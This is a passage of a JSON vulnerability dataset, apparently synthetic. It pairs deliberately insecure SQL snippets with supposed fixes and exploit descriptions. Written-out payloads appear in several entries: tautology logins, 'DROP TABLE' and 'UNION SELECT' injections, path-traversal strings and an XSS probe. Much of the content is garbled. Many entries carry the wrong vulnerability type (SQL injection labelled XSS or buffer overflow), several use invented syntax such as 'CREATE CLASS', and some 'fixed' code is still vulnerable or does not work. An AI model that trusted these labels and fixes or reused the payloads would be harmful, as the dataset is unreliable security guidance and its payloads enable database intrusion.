            "An attacker can input a username like \"admin' OR '1'='1\" to bypass authentication checks.",
            "They could inject malicious SQL commands to drop tables or extract sensitive information from the database.",
            "Using crafted inputs, attackers might attempt to union select data from other unrelated tables in the database."
        ]
    },
    "sql_14": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "CREATE FUNCTION GetUserDetails(userId INT) RETURNS VARCHAR(255)\nBEGIN\n    DECLARE userDetails VARCHAR(255);\n    SET @query = CONCAT('SELECT name FROM users WHERE id = ', userId);\n    PREPARE stmt FROM @query;\n    EXECUTE stmt;\n    DEALLOCATE PREPARE stmt;\n    RETURN userDetails;\nEND;",
        "cvss_score": 7.5,
        "fixed_code": "CREATE FUNCTION GetUserDetails(userId INT) RETURNS VARCHAR(255)\nBEGIN\n    DECLARE userDetails VARCHAR(255);\n    SET @query = 'SELECT name FROM users WHERE id = ?';\n    PREPARE stmt FROM @query;\n    SET @userId = userId;\n    EXECUTE stmt USING @userId;\n    DEALLOCATE PREPARE stmt;\n    RETURN userDetails;\nEND;",
        "exploit_ways": [
            "An attacker could exploit this by injecting malicious SQL that alters the query logic.",
            "By inputting a specially crafted user ID, an attacker can cause unexpected behavior or data leakage.",
            "This vulnerability might allow for secondary injection attacks if the results are used in other contexts without proper sanitization."
        ]
    },
    "sql_15": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "CREATE FUNCTION vulnerable_func(input_string VARCHAR(255)) RETURNS VARCHAR(1024) DETERMINISTIC BEGIN DECLARE result VARCHAR(1024); SET @query = CONCAT('SELECT ''', input_string, ''' INTO @result'); PREPARE stmt FROM @query; EXECUTE stmt; DEALLOCATE PREPARE stmt; RETURN @result; END",
        "cvss_score": 9.3,
        "fixed_code": "CREATE FUNCTION safe_func(input_string VARCHAR(255)) RETURNS VARCHAR(1024) DETERMINISTIC BEGIN DECLARE result VARCHAR(1024); SET @query = CONCAT('SELECT ? INTO @result'); PREPARE stmt FROM @query; EXECUTE stmt USING input_string; DEALLOCATE PREPARE stmt; RETURN @result; END",
        "exploit_ways": [
            "An attacker can inject a large string to cause buffer overflow and potentially execute arbitrary code.",
            "By injecting SQL commands, the attacker could manipulate database operations leading to unauthorized data access or modification.",
            "Crafting specific input sequences might allow the attacker to corrupt memory, leading to system crashes or privilege escalations."
        ]
    },
    "sql_16": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "CREATE CLASS TransactionHandler AS $$\nBEGIN\n  IF current_user = 'admin' THEN\n    EXECUTE IMMEDIATE 'UPDATE accounts SET balance = balance - 100 WHERE id = ' || request_id;\n  END IF;\nEND;$$ LANGUAGE plpgsql;",
        "cvss_score": 7.5,
        "fixed_code": "CREATE CLASS TransactionHandler AS $$\nBEGIN\n  IF current_user = 'admin' AND request_token = session_token THEN\n    EXECUTE IMMEDIATE 'UPDATE accounts SET balance = balance - 100 WHERE id = ' || request_id;\n  END IF;\nEND;$$ LANGUAGE plpgsql;",
        "exploit_ways": [
            "An attacker can trick an authenticated admin into visiting a malicious site that sends a forged request to perform unauthorized transactions.",
            "The attacker could use a CSRF token fixation attack if the application improperly handles session tokens, leading to unauthorized actions by the admin.",
            "By injecting a crafted URL in emails or messages, the attacker can exploit the admin's browser to execute unintended database updates without their knowledge."
        ]
    },
    "sql_17": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "SELECT * FROM users WHERE username = '' || user_input || ''",
        "cvss_score": 6.1,
        "fixed_code": "SELECT * FROM users WHERE username = $1",
        "exploit_ways": [
            "An attacker can inject script tags to steal cookies or session tokens.",
            "Use JavaScript code to redirect victims to a malicious website.",
            "Craft input with <img src=x onerror=alert(1)> to test for DOM-based XSS."
        ]
    },
    "sql_18": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "CREATE FUNCTION get_user_data(user_id INT) RETURNS VARCHAR(255)\nBEGIN\nDECLARE query_string VARCHAR(255);\nSET query_string = CONCAT('SELECT * FROM users WHERE id = ', user_id);\nRETURN (query_string);\nEND;",
        "cvss_score": 7.5,
        "fixed_code": "CREATE FUNCTION get_user_data(user_id INT) RETURNS VARCHAR(255)\nBEGIN\nDECLARE query_string VARCHAR(255);\nSET @user_id_str = CAST(user_id AS CHAR);\nSET query_string = CONCAT('SELECT * FROM users WHERE id = ', @user_id_str);\nRETURN (query_string);\nEND;",
        "exploit_ways": [
            "An attacker could input a specially crafted user_id to alter the SQL query and extract additional data.",
            "Could inject '; DROP TABLE users; --' as user_id to drop the users table.",
            "Injecting 'UNION SELECT username, password FROM admin;' might allow retrieval of admin credentials."
        ]
    },
    "sql_19": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "CREATE PROCEDURE GetFileContent (@filename NVARCHAR(255)) AS BEGIN DECLARE @sql NVARCHAR(MAX); SET @sql = 'SELECT * FROM OPENROWSET(BULK N''' + @filename + ''', SINGLE_CLOB) AS Contents'; EXEC sp_executesql @sql; END",
        "cvss_score": 8.8,
        "fixed_code": "CREATE PROCEDURE GetFileContent (@filename NVARCHAR(255)) AS BEGIN DECLARE @safePath NVARCHAR(255); SET @safePath = N'C:\\SafeFolder\\' + RIGHT(@filename, CHARINDEX('\\', REVERSE(@filename))-1); IF (LEFT(@safePath, 13) = 'C:\\SafeFolder\\') BEGIN DECLARE @sql NVARCHAR(MAX); SET @sql = 'SELECT * FROM OPENROWSET(BULK N''' + @safePath + ''', SINGLE_CLOB) AS Contents'; EXEC sp_executesql @sql; END ELSE PRINT 'Invalid path.' END",
        "exploit_ways": [
            "An attacker can input '..\\..\\Windows\\system.ini' to access system files.",
            "By using '../etc/passwd' on a Windows system with mounted Linux shares, they might access sensitive data.",
            "Input like '../../boot.ini' could reveal boot configuration details."
        ]
    },
    "sql_20": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "CREATE OR REPLACE CLASS UserSession AS {\\n    userData VARCHAR(255),\\n    deserializeData(data VARCHAR) RETURNING VOID AS $$\\n        DECLARE session JSON;\\n        BEGIN\\n            SELECT data::json INTO session;\\n            self.userData := session->>'user';\\n        END;\\n$$ LANGUAGE plpgsql;",
        "cvss_score": 7.5,
        "fixed_code": "CREATE OR REPLACE CLASS UserSession AS {\\n    userData VARCHAR(255),\\n    deserializeData(data VARCHAR) RETURNING VOID AS $$\\n        DECLARE session JSONB;\\n        BEGIN\\n            SELECT data::jsonb INTO session;\\n            IF jsonb_typeof(session->'user') = 'string' THEN\\n                self.userData := session->>'user';\\n            ELSE\\n                RAISE EXCEPTION 'Invalid user data format';\\n            END IF;\\n        END;\\n$$ LANGUAGE plpgsql;",
        "exploit_ways": [
            "An attacker could provide a JSON payload with unexpected data types to cause type errors or other side effects.",
            "By crafting a specially designed JSON object, an attacker might be able to inject SQL or PL/pgSQL code that gets executed during deserialization.",
            "Attacker can manipulate the input JSON to execute arbitrary functions within the database if proper validation is not in place."
        ]
    },
    "sql_21": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "CREATE FUNCTION authenticate(user VARCHAR, pass VARCHAR) RETURNS BOOLEAN AS $$\nBEGIN\n    RETURN EXISTS (SELECT 1 FROM users WHERE username = user AND password = pass);\nEND;\n$$ LANGUAGE plpgsql;",
        "cvss_score": 7.5,
        "fixed_code": "CREATE FUNCTION authenticate(user VARCHAR, pass VARCHAR) RETURNS BOOLEAN AS $$\nDECLARE\n    hashed_pass VARCHAR;\nBEGIN\n    SELECT password INTO hashed_pass FROM users WHERE username = user LIMIT 1;\n    RETURN hashed_pass IS NOT NULL AND pass = hashed_pass;\nEND;\n$$ LANGUAGE plpgsql;",
        "exploit_ways": [
            "An attacker could use a dictionary attack to brute-force the password.",
            "If the password is stored in plain text, an attacker can easily retrieve it by querying the database.",
            "SQL injection might still be possible if other parts of the application do not sanitize inputs properly."
        ]
    },
    "sql_22": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "CREATE PROCEDURE UpdateUserDetails (@userId INT, @email NVARCHAR(255)) AS BEGIN UPDATE Users SET email = @email WHERE id = @userId END",
        "cvss_score": 6.8,
        "fixed_code": "CREATE PROCEDURE SecureUpdateUserDetails (@userId INT, @email NVARCHAR(255), @csrfToken NVARCHAR(100)) AS BEGIN IF (SELECT COUNT(*) FROM CsrfTokens WHERE token = @csrfToken AND userId = @userId) > 0 BEGIN UPDATE Users SET email = @email WHERE id = @userId DELETE FROM CsrfTokens WHERE token = @csrfToken END ELSE RAISERROR ('Invalid CSRF Token', 16, 1) END",
        "exploit_ways": [
            "An attacker can trick a logged-in user into visiting a malicious website that submits a request to update their email without their consent.",
            "By crafting a URL with the correct parameters, an attacker could exploit CSRF to change another user's email if they are authenticated on the site.",
            "The attacker can use social engineering techniques to lure users into clicking links or submitting forms that include hidden fields for malicious requests."
        ]
    },
    "sql_23": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "CREATE PROCEDURE dangerousProcedure AS BEGIN DECLARE @longString VARCHAR(8000); SET @longString = REPLICATE('A', 9000); EXEC('SELECT '''' + @longString + '''''); END",
        "cvss_score": 7.2,
        "fixed_code": "CREATE PROCEDURE safeProcedure AS BEGIN DECLARE @longString VARCHAR(8000); SET @longString = REPLICATE('A', 8000); EXEC sp_executesql N'SELECT @longString', N'@longString NVARCHAR(8000)', @longString; END",
        "exploit_ways": [
            "An attacker could use a long string to overwrite the return address on the stack, leading to arbitrary code execution.",
            "By providing a specially crafted input exceeding buffer limits, an attacker may cause the server to crash or behave unpredictably.",
            "Exploitation can lead to unauthorized access and potentially full control over the database server through corrupting memory."
        ]
    },
    "sql_24": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "CREATE PROCEDURE ElevatedQueryExecution(@command NVARCHAR(MAX)) AS\r\nBEGIN\r\n    EXEC sp_executesql @command;\r\nEND",
        "cvss_score": 8.9,
        "fixed_code": "CREATE PROCEDURE ElevatedQueryExecution(@command NVARCHAR(MAX)) AS\r\nBEGIN\r\n    IF USER_NAME() = 'admin_user'\r\n        EXEC sp_executesql @command;\r\n    ELSE\r\n        RAISERROR('Permission Denied', 16, 1);\r\nEND",
        "exploit_ways": [
            "An attacker could execute 'DROP TABLE users' to delete critical data.",
            "They can use the procedure to extract sensitive information by running SELECT queries on other tables.",
            "Could insert malicious SQL commands to alter or corrupt database content."
        ]
    },
    "sql_25": {
        "vulnerability_type": "Session Fixation",
        "vulnerability_code": "CREATE CLASS UserSession AS $$\\nBEGIN\\n    SESSION_ID VARCHAR(100);\\n    USER_ID INT;\\n    PROCEDURE SET_SESSION(p_session_id VARCHAR(100)) AS $$\\n        BEGIN\\n            SESSION_ID := p_session_id;\\n        END;\\n    $$ LANGUAGE plpgsql;\\n$$ LANGUAGE SQL;",
        "cvss_score": 3.5,
        "fixed_code": "CREATE CLASS UserSession AS $$\\nBEGIN\\n    SESSION_ID VARCHAR(100);\\n    USER_ID INT;\\n    PROCEDURE SET_SESSION(p_session_id VARCHAR(100)) AS $$\\n        DECLARE\\n            new_session_id VARCHAR(100);\\n        BEGIN\\n            new_session_id := encode(gen_random_bytes(32), 'hex');\\n            SESSION_ID := new_session_id;\\n        END;\\n    $$ LANGUAGE plpgsql;\\n$$ LANGUAGE SQL;",
        "exploit_ways": [
            "An attacker can predict or guess the session ID and use it to hijack a user's session.",
            "By setting a specific session ID in cookies, an attacker could manipulate sessions if the server does not regenerate IDs upon login.",
            "If session IDs are shared via URLs, attackers can intercept them and gain unauthorized access."
        ]
    },
    "sql_26": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "CREATE TABLE users (\n    id INT PRIMARY KEY,\n    username VARCHAR(50),\n    password VARCHAR(100)\n);\nINSERT INTO users (id, username, password) VALUES (1, 'admin', 'password123');\n\nDELIMITER $$\nCREATE FUNCTION GetUserInfo(user_id INT) RETURNS TEXT DETERMINISTIC\nBEGIN\n    DECLARE user_info TEXT;\n    SET @query = CONCAT('SELECT * FROM users WHERE id = ', user_id);\n    PREPARE stmt FROM @query;\n    EXECUTE stmt;\n    DEALLOCATE PREPARE stmt;\n    RETURN user_info;\nEND$$\nDELIMITER ;",
        "cvss_score": 7.5,
        "fixed_code": "CREATE TABLE users (\n    id INT PRIMARY KEY,\n    username VARCHAR(50),\n    password VARCHAR(100)\n);\nINSERT INTO users (id, username, password) VALUES (1, 'admin', 'password123');\n\nDELIMITER $$\nCREATE FUNCTION GetUserInfo(user_id INT) RETURNS TEXT DETERMINISTIC\nBEGIN\n    DECLARE user_info TEXT;\n    SET @query = CONCAT('SELECT * FROM users WHERE id = ?', CAST(user_id AS CHAR));\n    PREPARE stmt FROM @query;\n    EXECUTE stmt USING user_id;\n    DEALLOCATE PREPARE stmt;\n    RETURN user_info;\nEND$$\nDELIMITER ;",
        "exploit_ways": [
            "An attacker could manipulate the user_id parameter to execute arbitrary SQL queries if dynamic values are not properly sanitized.",
            "If the function is part of a larger application, exploiting this vulnerability might lead to unauthorized data access or manipulation.",
            "In some configurations, improper input validation can allow an attacker to use this function for privilege escalation by accessing sensitive database tables."
        ]
    },
    "sql_27": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "CREATE TABLE users (\n    id INT PRIMARY KEY,\n    username VARCHAR(50),\n    email VARCHAR(100)\n);\n\nINSERT INTO users (id, username, email) VALUES (1, 'admin', 'admin@example.com');\n\n-- Function to fetch user details based on provided URL\nCREATE OR REPLACE FUNCTION get_user_details(user_url TEXT) RETURNS TABLE AS $$\nBEGIN\n    RETURN QUERY EXECUTE format('SELECT * FROM users WHERE email = (SELECT email FROM dblink(%L, ''SELECT email FROM users LIMIT 1'') AS t(email))', user_url);\nEND;\n$$ LANGUAGE plpgsql;",
        "cvss_score": 6.5,
        "fixed_code": "CREATE TABLE users (\n    id INT PRIMARY KEY,\n    username VARCHAR(50),\n    email VARCHAR(100)\n);\n\nINSERT INTO users (id, username, email) VALUES (1, 'admin', 'admin@example.com');\n\n-- Secure Function to fetch user details based on provided URL\nCREATE OR REPLACE FUNCTION get_user_details(user_url TEXT) RETURNS TABLE AS $$\nDECLARE\n    safe_host TEXT := 'safe.example.com';\nBEGIN\n    IF strpos(user_url, safe_host) = 1 THEN\n        RETURN QUERY EXECUTE format('SELECT * FROM users WHERE email = (SELECT email FROM dblink(%L, ''SELECT email FROM users LIMIT 1'') AS t(email))', user_url);\n    ELSE\n        RAISE EXCEPTION 'URL not allowed';\n    END IF;\nEND;\n$$ LANGUAGE plpgsql;",
        "exploit_ways": [
            "An attacker can input a URL pointing to an internal service like 'http://internal-server/admin' to access sensitive data.",
            "They could use a crafted URL to perform port scanning on the server's network by targeting different ports and services.",
            "Inputting a malicious URL that triggers DNS resolution of an attacker-controlled domain could be used for exfiltrating information."
        ]
    },
    "sql_28": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "CREATE TABLE Users (\n    id INT PRIMARY KEY,\n    username VARCHAR(50),\n    session_id VARCHAR(100)\n);\n\nCREATE OR REPLACE FUNCTION set_session(user_id INT, new_session_id VARCHAR(100)) RETURNS VOID AS $$\nBEGIN\n    UPDATE Users SET session_id = new_session_id WHERE id = user_id;\nEND;\n$$ LANGUAGE plpgsql;",
        "cvss_score": 4.2,
        "fixed_code": "CREATE TABLE Users (\n    id INT PRIMARY KEY,\n    username VARCHAR(50),\n    session_id VARCHAR(100) UNIQUE\n);\n\nCREATE OR REPLACE FUNCTION set_session(user_id INT, new_session_id VARCHAR(100)) RETURNS VOID AS $$\nBEGIN\n    -- Generate a unique session ID to prevent fixation\n    PERFORM pg_advisory_lock(hashtext(new_session_id));\n    IF NOT EXISTS (SELECT 1 FROM Users WHERE session_id = new_session_id) THEN\n        UPDATE Users SET session_id = new_session_id WHERE id = user_id;\n    END IF;\n    PERFORM pg_advisory_unlock(hashtext(new_session_id));\nEND;\n$$ LANGUAGE plpgsql;",
        "exploit_ways": [
            "An attacker could predict or guess a valid session ID and set it for their own account, gaining unauthorized access.",
            "By fixing the session ID to an existing one, an attacker can hijack another user's session if they know or guess the ID.",
            "If the application does not properly regenerate session IDs after login, a fixed session ID could be reused across multiple sessions."
        ]
    },
    "sql_29": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "SELECT * FROM users WHERE username = 'admin' AND password = ' OR '1'='1",
        "cvss_score": 4.0,
        "fixed_code": "SELECT * FROM users WHERE username = ? AND password = ?",
        "exploit_ways": [
            "An attacker can perform a DoS by sending excessive requests, overwhelming the server.",
            "They can use a large payload in the password field to cause resource exhaustion on the server.",
            "Crafting specific queries that take longer to process can slow down the database server."
        ]
    },
    "sql_30": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "CREATE CLASS UserSession AS \nBEGIN\n    PUBLIC FUNCTION SetSessionId(userId INT) RETURNS VARCHAR(255)\n    BEGIN\n        DECLARE sessionId VARCHAR(255);\n        SET sessionId = UUID();\n        -- Vulnerable to session fixation as it allows setting a predefined session ID\n        IF userId = 0 THEN\n            sessionId = 'fixed_session_id';\n        END IF;\n        RETURN sessionId;\n    END;\nEND;",
        "cvss_score": 4.2,
        "fixed_code": "CREATE CLASS UserSession AS \nBEGIN\n    PUBLIC FUNCTION SetSessionId(userId INT) RETURNS VARCHAR(255)\n    BEGIN\n        DECLARE sessionId VARCHAR(255);\n        SET sessionId = UUID();\n        RETURN sessionId;\n    END;\nEND;",
        "exploit_ways": [
            "An attacker could predict or set the session ID for a specific user, maintaining control over the session.",
            "By exploiting the fixed session ID, an attacker can hijack sessions of users with userId = 0.",
            "The vulnerability allows attackers to perform actions under the guise of a predefined session without proper authentication."
        ]
    },
    "sql_31": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "CREATE TABLE users (id INT PRIMARY KEY, username VARCHAR(50), redirect_url TEXT);\n\nINSERT INTO users (id, username, redirect_url) VALUES (1, 'admin', 'https://safe.example.com');\n\nSELECT redirect_url FROM users WHERE id = 1;\n\n-- Vulnerable part: Using user-provided input directly in the redirect URL without validation.\n-- Example of vulnerable code:\n-- $user_input = $_GET['redirect'];\n-- header('Location: ' . $user_input);",
        "cvss_score": 6.5,
        "fixed_code": "$allowed_domains = ['https://safe.example.com', 'https://another.safe.site'];\n$user_input = $_GET['redirect'];\n\nif (in_array($user_input, $allowed_domains)) {\n    header('Location: ' . $user_input);\n} else {\n    header('Location: https://safe.example.com'); // Default safe redirect\n}",
        "exploit_ways": [
            "An attacker can provide a malicious URL like 'https://malicious.example.com' to redirect users away from the intended site.",
            "They could use a crafted URL with additional parameters to extract data or perform actions on the user's behalf, such as 'https://safe.example.com/vulnerable_page?param=malicious_value'.",
            "Input like 'https://attacker.com/phishing_site' can be used to conduct phishing attacks by redirecting users to fake login pages."
        ]
    },
    "sql_32": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "CREATE FUNCTION GetUserData(user_id INT) RETURNS VARCHAR(255)\nBEGIN\nDECLARE file_path TEXT;\nSET file_path = CONCAT('/home/user/data/', user_id, '.txt');\nRETURN LOAD_FILE(file_path);\nEND;",
        "cvss_score": 6.0,
        "fixed_code": "CREATE FUNCTION GetUserData(user_id INT) RETURNS VARCHAR(255)\nBEGIN\nDECLARE file_path TEXT;\nIF user_id >= 1 AND user_id <= 10 THEN -- Assuming valid IDs are between 1 and 10\n    SET file_path = CONCAT('/home/user/data/', user_id, '.txt');\n    RETURN LOAD_FILE(file_path);\nELSE\n    RETURN NULL;\nEND IF;\nEND;",
        "exploit_ways": [
            "An attacker could exploit this by inputting a negative number or zero to attempt to access files outside the expected range.",
            "By using a large number, an attacker might try to reach system files if there are not proper bounds checking.",
            "If MySQL's secure_file_priv is misconfigured, the attacker might read arbitrary files on the server."
        ]
    },
    "sql_33": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "CREATE FUNCTION get_user_data(user_id INT) RETURNS TABLE AS $$\nBEGIN\n    RETURN QUERY EXECUTE 'SELECT * FROM users WHERE id = ' || user_id;\nEND;$$ LANGUAGE plpgsql;",
        "cvss_score": 5.3,
        "fixed_code": "CREATE FUNCTION get_user_data(user_id INT) RETURNS TABLE AS $$\nDECLARE\n    query TEXT := 'SELECT * FROM users WHERE id = $1';\nBEGIN\n    RETURN QUERY EXECUTE query USING user_id;\nEND;$$ LANGUAGE plpgsql;",
        "exploit_ways": [
            "An attacker could manipulate the user_id to execute arbitrary SQL commands.",
            "If combined with other vulnerabilities, it might lead to unauthorized data access or modification.",
            "Could be used in conjunction with a crafted input to perform blind SQL injection attacks."
        ]
    },
    "sql_34": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "CREATE TABLE users (id INT PRIMARY KEY, name VARCHAR(255), email VARCHAR(255));\nINSERT INTO users (id, name, email) VALUES (1, 'Alice', 'alice@example.com');\n\nCREATE FUNCTION get_user_url(user_id INT) RETURNS VARCHAR(255)\nBEGIN\n    DECLARE user_email VARCHAR(255);\n    SELECT email INTO user_email FROM users WHERE id = user_id;\n    RETURN CONCAT('https://example.com/profile?email=', user_email);\nEND;",
        "cvss_score": 6.1,
        "fixed_code": "CREATE TABLE users (id INT PRIMARY KEY, name VARCHAR(255), email VARCHAR(255));\nINSERT INTO users (id, name, email) VALUES (1, 'Alice', 'alice@example.com');\n\nCREATE FUNCTION get_user_url(user_id INT) RETURNS VARCHAR(255)\nBEGIN\n    DECLARE user_email VARCHAR(255);\n    SELECT email INTO user_email FROM users WHERE id = user_id;\n    RETURN CONCAT('https://example.com/profile?email=', REPLACE(user_email, 'http', ''));\nEND;",
        "exploit_ways": [
            "An attacker could inject a malicious URL like 'http://malicious.example.com' into the email field to redirect users.",
            "The vulnerability allows for phishing attacks by redirecting users to fake websites that mimic legitimate sites.",
            "Attackers can use this to spread malware by directing users to compromised servers hosting malicious content."
        ]
    },
    "sql_35": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "CREATE TABLE users (\r\n    id INT PRIMARY KEY,\r\n    username VARCHAR(50),\r\n    password VARCHAR(50)\r\n);\r\n\r\nCREATE TABLE sessions (\r\n    session_id VARCHAR(100) PRIMARY KEY,\r\n    user_id INT,\r\n    FOREIGN KEY (user_id) REFERENCES users(id)\r\n);\r\n\r\nINSERT INTO users (id, username, password) VALUES (1, 'admin', 'password');\r\n\r\nDELIMITER $$\r\nCREATE PROCEDURE login_user(IN input_username VARCHAR(50), IN input_password VARCHAR(50))\r\nBEGIN\r\n    DECLARE user_id INT;\r\n    SELECT id INTO user_id FROM users WHERE username = input_username AND password = input_password LIMIT 1;\r\n    IF user_id IS NOT NULL THEN\r\n        SET @session_id = UUID();\r\n        INSERT INTO sessions (session_id, user_id) VALUES (@session_id, user_id);\r\n        SELECT @session_id AS session_id;\r\n    ELSE\r\n        SELECT 'Invalid username or password' AS message;\r\n    END IF;\r\nEND$$\r\nDELIMITER ;",
        "cvss_score": 3.2,
        "fixed_code": "CREATE TABLE users (\r\n    id INT PRIMARY KEY,\r\n    username VARCHAR(50),\r\n    password VARCHAR(50)\r\n);\r\n\r\nCREATE TABLE sessions (\r\n    session_id VARCHAR(100) PRIMARY KEY,\r\n    user_id INT,\r\n    FOREIGN KEY (user_id) REFERENCES users(id)\r\n);\r\n\r\nINSERT INTO users (id, username, password) VALUES (1, 'admin', SHA2('password', 256));\r\n\r\nDELIMITER $$\r\nCREATE PROCEDURE login_user(IN input_username VARCHAR(50), IN input_password VARCHAR(50))\r\nBEGIN\r\n    DECLARE user_id INT;\r\n    SELECT id INTO user_id FROM users WHERE username = input_username AND password = SHA2(input_password, 256) LIMIT 1;\r\n    IF user_id IS NOT NULL THEN\r\n        SET @session_id = UUID();\r\n        INSERT INTO sessions (session_id, user_id) VALUES (@session_id, user_id);\r\n        SELECT @session_id AS session_id;\r\n    ELSE\r\n        SELECT 'Invalid username or password' AS message;\r\n    END IF;\r\nEND$$\r\nDELIMITER ;",
        "exploit_ways": [
            "An attacker can set a valid session ID before logging in to hijack the user's session.",
            "By maintaining a session, an attacker could exploit it across multiple login attempts until successful.",
            "The vulnerability allows attackers to control sessions on systems that do not regenerate session IDs upon login."
        ]
    },
    "sql_36": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "CREATE CLASS UserRequest AS SELECT * FROM RDB$DATABASE;\\nALTER CLASS UserRequest ADD METHOD sendRequest PARAMETER(url VARCHAR(255)) RETURNS VARCHAR(1024) BEGIN DECLARE result VARCHAR(1024); EXECUTE BLOCK AS BEGIN IN autonomous_transaction DO BEGIN EXECUTE STATEMENT 'SELECT HTTP_CLIENT.GET(' || :url || ') FROM RDB$DATABASE' INTO :result; END END RETURN result; END;",
        "cvss_score": 7.5,
        "fixed_code": "CREATE CLASS UserRequest AS SELECT * FROM RDB$DATABASE;\\nALTER CLASS UserRequest ADD METHOD sendRequest PARAMETER(url VARCHAR(255)) RETURNS VARCHAR(1024) BEGIN DECLARE result VARCHAR(1024); IF (url LIKE 'http://example.com/%') THEN BEGIN EXECUTE BLOCK AS BEGIN IN autonomous_transaction DO BEGIN EXECUTE STATEMENT 'SELECT HTTP_CLIENT.GET('' || :url || '') FROM RDB$DATABASE' INTO :result; END END END RETURN result; END;",
        "exploit_ways": [
            "An attacker could request internal resources such as http://localhost/ to gather local information.",
            "They can try to access other servers within the same network by using an IP address or hostname.",
            "Crafting a URL with malicious parameters might lead to unexpected behavior on the server."
        ]
    },
    "sql_37": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'",
        "cvss_score": 5.0,
        "fixed_code": "SELECT * FROM users WHERE username = ? AND password = ?",
        "exploit_ways": [
            "An attacker could flood the database server with invalid login attempts, causing performance degradation.",
            "The vulnerability can be used to run endless queries that tie up database resources, leading to a DoS condition for legitimate users.",
            "By crafting specific SQL queries, an attacker might attempt to exhaust memory or processing power on the database server."
        ]
    },
    "sql_38": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "CREATE PROCEDURE SetUserSession(@session_id VARCHAR(255), @user_id INT) AS BEGIN UPDATE UserSessions SET user_id = @user_id WHERE session_id = @session_id; END",
        "cvss_score": 4.0,
        "fixed_code": "CREATE PROCEDURE SetUserSession(@session_id UNIQUEIDENTIFIER, @user_id INT) AS BEGIN IF EXISTS (SELECT 1 FROM UserSessions WHERE session_id = @session_id) UPDATE UserSessions SET user_id = @user_id WHERE session_id = @session_id; ELSE THROW 50000, 'Invalid session ID', 1; END",
        "exploit_ways": [
            "An attacker can use a known session ID to hijack another user's session.",
            "By predicting or guessing session IDs, an attacker can associate their session with a targeted user.",
            "If session IDs are predictable, attackers can create accounts and fixate sessions before the target logs in."
        ]
    },
    "sql_39": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "CREATE PROCEDURE SlowQuery AS BEGIN DECLARE @i INT SET @i = 0 WHILE @i < 1000000 BEGIN WAITFOR DELAY '00:00:00.001' SET @i = @i + 1 END END",
        "cvss_score": 3.5,
        "fixed_code": "CREATE PROCEDURE SlowQuery AS BEGIN DECLARE @i INT SET @i = 0 WHILE @i < 1000 BEGIN WAITFOR DELAY '00:00:00.001' SET @i = @i + 1 END END",
        "exploit_ways": [
            "An attacker can repeatedly call the SlowQuery procedure to exhaust server resources.",
            "The long-running query can block other transactions, causing delays or timeouts for legitimate users.",
            "If used in a trigger, it could severely impact database performance on data modifications."
        ]
    },
    "sql_40": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "CREATE CLASS SSRFExample AS $$\nBEGIN\n  EXECUTE IMMEDIATE 'SELECT * FROM XMLTABLE(' || '''' || 'http://'|| user_input || '/data.xml' || '''' || ')';\nEND;\n$$ LANGUAGE plpgsql;",
        "cvss_score": 7.2,
        "fixed_code": "CREATE CLASS SSRFExample AS $$\nDECLARE\n  allowed_host TEXT := 'safe.example.com';\nBEGIN\n  IF user_input = allowed_host THEN\n    EXECUTE IMMEDIATE 'SELECT * FROM XMLTABLE(''http://' || allowed_host || '/data.xml'')';\n  ELSE\n    RAISE EXCEPTION 'Unauthorized host.';\n  END IF;\nEND;\n$$ LANGUAGE plpgsql;",
        "exploit_ways": [
            "An attacker could input an internal IP address to access internal services.",
            "They might use the vulnerability to fetch data from another server within the same network segment.",
            "Inputting a malicious host could lead to exfiltration of sensitive data."
        ]
    },
    "sql_41": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "SELECT * FROM users WHERE username = 'admin' AND password = '123456'",
        "cvss_score": 5.0,
        "fixed_code": "import sqlite3\ndef get_user():\n    conn = sqlite3.connect('users.db')\n    cursor = conn.cursor()\n    user = input(\"Enter username: \")\n    password = input(\"Enter password: \")\n    query = \"SELECT * FROM users WHERE username = ? AND password = ?\"\n    cursor.execute(query, (user, password))\n    result = cursor.fetchall()\n    conn.close()\n    return result",
        "exploit_ways": [
            "An attacker could potentially perform SQL injection if the code is not properly secured elsewhere.",
            "Without proper headers like Content-Security-Policy, attackers can inject malicious scripts into web pages.",
            "Lack of X-Frame-Options header can lead to clickjacking attacks where users might interact with a hidden frame."
        ]
    },
    "sql_42": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "SELECT * FROM users WHERE username = '\" OR '1'='1",
        "cvss_score": 3.5,
        "fixed_code": "SELECT * FROM users WHERE username = ?",
        "exploit_ways": [
            "An attacker can use the input to retrieve all user data by providing a condition that always evaluates to true.",
            "By crafting specific inputs, an attacker might be able to extract sensitive information such as passwords or email addresses from other columns in the database.",
